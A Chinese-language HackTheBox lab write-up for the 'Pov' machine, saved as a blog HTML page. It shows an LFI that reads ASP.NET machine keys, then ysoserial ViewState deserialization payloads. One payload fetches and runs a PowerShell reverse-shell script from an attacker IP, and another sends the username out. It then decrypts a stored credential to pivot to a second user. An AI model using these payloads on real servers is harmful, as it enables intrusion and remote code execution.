@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Pov中等機器 0x1 Nmap scan1234567880&#x2F;tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS&#x2F;10.0|_http-favicon: Unknown favicon MD5: E9B5E66DEBD9405ED864CAC17E2A888E|">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - Pov">
+<meta property="og:url" content="https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Pov中等機器 0x1 Nmap scan1234567880&#x2F;tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS&#x2F;10.0|_http-favicon: Unknown favicon MD5: E9B5E66DEBD9405ED864CAC17E2A888E|">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/04-pov-eAufCcOPiVSqkzMb/image-20240128121851-nu4v32e.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/04-pov-eAufCcOPiVSqkzMb/image-20240128133400-69yl1xg.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2024-htb/04-pov-eAufCcOPiVSqkzMb/image-20240128134216-fe3rnfn.png">
+<meta property="article:published_time" content="2024-01-28T14:20:00.000Z">
+<meta property="article:modified_time" content="2024-06-10T10:22:47.528Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://files.manesec.com/file/maneimg1/2024-htb/04-pov-eAufCcOPiVSqkzMb/image-20240128121851-nu4v32e.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - Pov</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/02/11/2024-htb-machine/06-crafty/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/01/21/2024-htb-machine/03-Analysis/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/&text=HackTheBox - Machine - Pov"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/&title=HackTheBox - Machine - Pov"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/&is_video=false&description=HackTheBox - Machine - Pov"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Pov&body=Check out this article: https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/&title=HackTheBox - Machine - Pov"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/&title=HackTheBox - Machine - Pov"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/&title=HackTheBox - Machine - Pov"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/&title=HackTheBox - Machine - Pov"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/&name=HackTheBox - Machine - Pov&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/01/28/2024-htb-machine/04-pov/&t=HackTheBox - Machine - Pov"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - Pov
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-01-28T14:20:00.000Z" class="dt-published" itemprop="datePublished">2024-01-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Pov"><a href="#Pov" class="headerlink" title="Pov"></a>Pov</h1><p>中等機器</p>
+<h2 id="0x1-Nmap-scan"><a href="#0x1-Nmap-scan" class="headerlink" title="0x1 Nmap scan"></a>0x1 Nmap scan</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-favicon: Unknown favicon MD5: E9B5E66DEBD9405ED864CAC17E2A888E</span><br><span class="line">|_http-title: pov.htb</span><br><span class="line">| http-methods:</span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x2-Vhost-scan"><a href="#0x2-Vhost-scan" class="headerlink" title="0x2 Vhost scan"></a>0x2 Vhost scan</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -u <span class="string">&quot;http://pov.htb&quot;</span> -H <span class="string">&quot;Host: FUZZ.pov.htb&quot;</span> -w /Tools/Wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 12330</span><br><span class="line"></span><br><span class="line">[Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 588ms]</span><br><span class="line">    * FUZZ: dev</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x3-dev-pov-htb-LFI"><a href="#0x3-dev-pov-htb-LFI" class="headerlink" title="0x3 dev.pov.htb - LFI"></a>0x3 dev.pov.htb - LFI</h2><p>來到 <code>http://dev.pov.htb/portfolio/</code>​，這下面有一個下載cv的按鈕，</p>
+<p>然後用burp 截取一下</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/04-pov-eAufCcOPiVSqkzMb/image-20240128121851-nu4v32e.png" alt="image">​</p>
+<p>儅改成 <code>default.aspx</code>​ 就可以看到源碼，説明這裏有LFI。</p>
+<p>aspx的服務器，然後掃描一下子目錄，包括後綴名 asp，aspx。</p>
+<p>有LFI，所以用response隨便抓取一下NTLM hash，這樣就會知道username。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SMB] NTLMv2-SSP Client   : 10.129.140.51</span><br><span class="line">[SMB] NTLMv2-SSP Username : POV\sfitz</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : sfitz::POV:a275ba01088d7130:EFDAE9009EB62BDD72506209E1AA698D:010100000000000000C5A39DE451DA01BA9178CCCF32817B00000000020008004D0057004B00350001001E00570049004E002D004A0057004D0053005A0055003800330059004D00590004003400570049004E002D004A0057004D0053005A0055003800330059004D0059002E004D0057004B0035002E004C004F00430041004C00030014004D0057004B0035002E004C004F00430041004C00050014004D0057004B0035002E004C004F00430041004C000700080000C5A39DE451DA0106000400020000000800300030000000000000000000000000200000DB47A1854A9446F7E8DEB2E1EE6FCFD180E8B8A435A15318CE25CFC0F0A785A60A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0033000000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>hashcat爆破不了密碼。</p>
+<p>感覺此地無銀三百兩，所以谷歌查了下幾個參數是否可以利用，</p>
+<p>谷歌查了下：</p>
+<p>​<code>__EVENTTARGET __EVENTARGUMENT __VIEWSTATE __VIEWSTATEGENERATOR __EVENTVALIDATION exploit </code>​</p>
+<p>看到這篇：</p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter">https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter</a></p>
+<p><a target="_blank" rel="noopener" href="https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817">https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.c-sharpcorner.com/UploadFile/225740/what-is-view-state-and-how-it-works-in-Asp-Net53/">https://www.c-sharpcorner.com/UploadFile/225740/what-is-view-state-and-how-it-works-in-Asp-Net53/</a></p>
+<h2 id="0x4-shell-in-the-box"><a href="#0x4-shell-in-the-box" class="headerlink" title="0x4 shell in the box"></a>0x4 shell in the box</h2><p>在hacktricks 裏面提到，MachineKey可能會在config.web出現，嘗試用LFI 看看裏面有什麽 <code>file=/web.config</code>​</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">system.web</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">customErrors</span> <span class="attr">mode</span>=<span class="string">&quot;On&quot;</span> <span class="attr">defaultRedirect</span>=<span class="string">&quot;default.aspx&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">httpRuntime</span> <span class="attr">targetFramework</span>=<span class="string">&quot;4.5&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">machineKey</span> <span class="attr">decryption</span>=<span class="string">&quot;AES&quot;</span> <span class="attr">decryptionKey</span>=<span class="string">&quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot;</span> <span class="attr">validation</span>=<span class="string">&quot;SHA1&quot;</span> <span class="attr">validationKey</span>=<span class="string">&quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">system.web</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">httpErrors</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">remove</span> <span class="attr">statusCode</span>=<span class="string">&quot;403&quot;</span> <span class="attr">subStatusCode</span>=<span class="string">&quot;-1&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">error</span> <span class="attr">statusCode</span>=<span class="string">&quot;403&quot;</span> <span class="attr">prefixLanguageFilePath</span>=<span class="string">&quot;&quot;</span> <span class="attr">path</span>=<span class="string">&quot;http://dev.pov.htb:8080/portfolio&quot;</span> <span class="attr">responseMode</span>=<span class="string">&quot;Redirect&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">httpErrors</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">httpRedirect</span> <span class="attr">enabled</span>=<span class="string">&quot;true&quot;</span> <span class="attr">destination</span>=<span class="string">&quot;http://dev.pov.htb/portfolio&quot;</span> <span class="attr">exactDestination</span>=<span class="string">&quot;false&quot;</span> <span class="attr">childOnly</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">targetFramework=&quot;4.5&quot;</span><br><span class="line"></span><br><span class="line">decryption=&quot;AES&quot; </span><br><span class="line">decryptionKey=&quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot; </span><br><span class="line"></span><br><span class="line">validation=&quot;SHA1&quot; </span><br><span class="line">validationKey=&quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>For ASP.NET framework ≥ 4.5, we need to supply the <em>decryption algorithm</em> and the <em>decryption key</em> to the ysoserial payload generator as follows:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -p ViewState -g TypeConfuseDelegate -c “echo 123 &gt; c:\windows\temp\test.txt” --path=”/site/test.aspx/” --apppath=”/directory” — decryptionalg=”AES” --decryptionkey=”EBA4DC83EB95564524FA63DB6D369C9FBAC5F867962EAC39&quot; --validationalg=”SHA1&quot; --validationkey=”B3C2624FF313478C1E5BB3B3ED7C21A121389C544F3E38F3AA46C51E91E6ED99E1BDD91A70CFB6FCA0AB53E99DD97609571AF6186DE2E4C0E9C09687B6F579B3&quot;</span><br></pre></td></tr></table></figure>
+
+<p>The <em>path</em> and <em>apppath</em> parameters above can be decided with the help of a little debugging. For the sake of an example, we will be using the below code.</p>
+<p><a target="_blank" rel="noopener" href="https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817">https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817</a></p>
+</blockquote>
+<p>利用 <a target="_blank" rel="noopener" href="https://github.com/pwntester/ysoserial.net%EF%BC%8C%E7%94%9F%E6%88%90%E4%B8%80%E5%80%8Bpayload">https://github.com/pwntester/ysoserial.net，生成一個payload</a></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -p ViewState -g TypeConfuseDelegate -c &quot;powershell.exe Invoke-WebRequest -Uri http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">16</span>.<span class="number">3</span>/$env:UserName&quot; --<span class="built_in">path</span>=&quot;/portfolio/default.aspx&quot;  --apppath=&quot;/&quot; --decryptionalg=&quot;AES&quot; --decryptionkey=&quot;<span class="number">74477</span>CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;<span class="number">5620</span>D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然後把生成的那段東西填入 <code>__VIEWSTATE</code>​ 就得到RCE。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/04-pov-eAufCcOPiVSqkzMb/image-20240128133400-69yl1xg.png" alt="image">​</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -p ViewState -g TypeConfuseDelegate -c &quot;powershell -ep bypass IEX(IWR http://<span class="number">10</span>.<span class="number">10</span>.<span class="number">16</span>.<span class="number">3</span>:<span class="number">3000</span>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <span class="number">10</span>.<span class="number">10</span>.<span class="number">16</span>.<span class="number">3</span> <span class="number">3001</span>&quot; --<span class="built_in">path</span>=&quot;/portfolio/default.aspx&quot;  --apppath=&quot;/&quot; --decryptionalg=&quot;AES&quot; --decryptionkey=&quot;<span class="number">74477</span>CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;<span class="number">5620</span>D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot;</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://files.manesec.com/file/maneimg1/2024-htb/04-pov-eAufCcOPiVSqkzMb/image-20240128134216-fe3rnfn.png" alt="image">​</p>
+<h2 id="0x5-User"><a href="#0x5-User" class="headerlink" title="0x5 User"></a>0x5 User</h2><p>winpeas找不到什麽好看的，所以乾脆用grep for windows找一下文件，結果grep好像有問題，於是使用ripgrep去找：<a target="_blank" rel="noopener" href="https://github.com/BurntSushi/ripgrep">https://github.com/BurntSushi/ripgrep</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\mane&gt; .\rg.exe <span class="literal">--no-messages</span>  <span class="literal">-rsi</span> <span class="string">&quot;alaading&quot;</span> C:\</span><br><span class="line">C:\Users\sfitz\Documents\connection.xml:      &lt;S N=<span class="string">&quot;UserName&quot;</span>&gt;<span class="built_in">si</span>&lt;/S&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x6-User-alaading"><a href="#0x6-User-alaading" class="headerlink" title="0x6 User: alaading"></a>0x6 User: alaading</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\mane&gt; <span class="built_in">type</span> C:\Users\sfitz\Documents\connection.xml</span><br><span class="line">&lt;Objs Version=<span class="string">&quot;1.1.0.1&quot;</span> xmlns=<span class="string">&quot;http://schemas.microsoft.com/powershell/2004/04&quot;</span>&gt;</span><br><span class="line">  &lt;Obj RefId=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">    &lt;TN RefId=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;</span><br><span class="line">      &lt;T&gt;System.Object&lt;/T&gt;</span><br><span class="line">    &lt;/TN&gt;</span><br><span class="line">    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;</span><br><span class="line">    &lt;Props&gt;</span><br><span class="line">      &lt;S N=<span class="string">&quot;UserName&quot;</span>&gt;alaading&lt;/S&gt;</span><br><span class="line">      &lt;SS N=<span class="string">&quot;Password&quot;</span>&gt;<span class="number">01000000</span>d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179</span><br><span class="line"><span class="number">107379</span>a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2<span class="built_in">ac</span></span><br><span class="line"><span class="number">0</span>c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6&lt;/SS&gt;</span><br><span class="line">    &lt;/Props&gt;</span><br><span class="line">  &lt;/Obj&gt;</span><br><span class="line">&lt;/Objs&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用這個文件去登錄其他用戶</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sfitz\Documents&gt; <span class="variable">$cred</span> = <span class="built_in">Import-CliXml</span> .\connection.xml</span><br><span class="line"><span class="built_in">PS</span> C:\Users\sfitz\Documents&gt; <span class="variable">$session</span> = <span class="built_in">New-PSSession</span> <span class="literal">-ConfigurationName</span> Microsoft.PowerShell <span class="literal">-Credential</span> <span class="variable">$cred</span></span><br><span class="line"><span class="built_in">PS</span> C:\Users\sfitz\Documents&gt; <span class="built_in">Invoke-Command</span> <span class="literal">-Session</span> <span class="variable">$session</span> &#123; whoami &#125;</span><br><span class="line">pov\alaading</span><br><span class="line"><span class="built_in">PS</span> C:\Users\sfitz\Documents&gt; <span class="built_in">Invoke-Command</span> <span class="literal">-Session</span> <span class="variable">$session</span> &#123; whoami /priv &#125;</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== ========</span><br><span class="line">SeDebugPrivilege              Debug programs                 Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a <span class="keyword">process</span> working <span class="built_in">set</span> Enabled</span><br></pre></td></tr></table></figure>
+
+<p>然後看了下，看起來需要bypass UAC，所以要解出原本的密碼</p>
